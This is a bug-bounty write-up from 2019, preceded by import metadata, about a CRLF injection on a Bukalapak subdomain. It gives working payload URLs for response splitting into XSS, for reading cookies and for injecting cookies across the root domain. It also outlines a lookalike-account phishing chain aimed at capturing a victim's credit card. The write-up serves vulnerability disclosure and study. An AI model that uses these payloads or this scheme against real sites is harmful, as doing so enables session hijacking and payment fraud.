---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-08-06_crlf-injection-allow-cookie-injection-in-root-domain-xss.md
original_filename: 2019-08-06_crlf-injection-allow-cookie-injection-in-root-domain-xss.md
title: CRLF injection allow => cookie injection in root domain & xss
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: adea7e127c27ebf1c35e2ba5439ee81bb2f1a6d0dae3ebdc28441bc8efe31137
text_sha256: 681bceb333cf53eb7c6743971d7ac53920adabf4afedf0879d2c9e5975c9d119
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# CRLF injection allow => cookie injection in root domain & xss

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-08-06_crlf-injection-allow-cookie-injection-in-root-domain-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `adea7e127c27ebf1c35e2ba5439ee81bb2f1a6d0dae3ebdc28441bc8efe31137`
- Text SHA256: `681bceb333cf53eb7c6743971d7ac53920adabf4afedf0879d2c9e5975c9d119`


## Content

---
title: "CRLF injection allow => cookie injection in root domain & xss"
url: "https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b"
authors: ["Abdelhak Kharroubi"]
programs: ["Bukalapak"]
bugs: ["CRLF injection"]
publication_date: "2019-08-06"
added_date: "2022-10-12"
source: "pentester.land/writeups.json"
original_index: 5095
scraped_via: "browseros"
---

# CRLF injection allow => cookie injection in root domain & xss

CRLF injection allow => cookie injection in root domain & xss
Abdelhak Kharroubi
Follow
3 min read
·
Aug 7, 2019

86

1

intro crlf https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection

Description:

i found CRLF injection in https://glimpse.bukalapak.com ( i know is out of scope but have critical impact in all domain bukalapak.com)

this vulnerabilty allow me inject cookie in the root domain

and inject code html with javascript with bypass xss protection header get session_id;)

first CRLF to HTML injection &XSS

how to reproduce this issue

test it in chrome

ps X-XSS-Protection:0 its important to bypass chrome xss protection

1-open this link

https://glimpse.bukalapak.com/redirect?link=%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.domain)</script><!--

Press enter or click to view image in full size
Press enter or click to view image in full size

you can get cookie with this link (all cookies configured can use it in any subdomain of bukalapak.com)you can get session_id

go to https://glimpse.bukalapak.com/redirect?link=%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.cookie)</script><!--

Press enter or click to view image in full size

first CRLF to inject cookie

ho to reproduce this issue

test it in chrome

1-open this link

Get Abdelhak Kharroubi’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

https://glimpse.bukalapak.com/redirect?link=%0d%0aSet-Cookie%3a+newcookie%3dvalue1%3b+domain%3d.bukalapak.com%3b+path%3d/%3b%250d%250aSet-Cookie%3a+newcookie2%3dvalue2%3b+domain%3d.bukalapak.com%3b+path%3d/%3b

Press enter or click to view image in full size

Impact

1- get cookie with xss (session_id)

2-force user logout with clean cookie (tested) {Set-Cookie: lskjfewjrh34ghj23brjh234=;Set-Cookie: session_id=;Set-Cookie: user_credentials=;}

3-turn self xss with cookie based to stored xss

4- force user to login with other account (see explanation & video) with same impact like add cc ;)

and other

explanation 4 impact

1-create account with name of victim (the site allow it ) and put email seems like his email {email victim ha9kou@gmail.com

you can put ha9kou@gmall.com}

2- verify the email with previous vulnerability [break and bypass verification email] === this one of many impact :D

3-get the cookie of this account and inject it in the link vulnerable +add same phishing text in html like [ add you Credit card to confirm your account ] and redirect it to payment setting https://www.bukalapak.com/users/payment_settings

5-when the victim go to the vulnerable link will {1- change cookies ,2- show phishing message ,3- redirect to payment setting}

6- the victim think that he still in his account (same name and same email with verified mark ) the victim will add his credit card

7-now you can force user to logout from your account (impact 2) ;and you have email and password of this account linked with cc of victim

https://www.youtube.com/watch?v=ODFfwW2kxCE

SIMILAR REPORT

https://hackerone.com/reports/52042

https://hackerone.com/reports/237357

https://hackerone.com/reports/174474
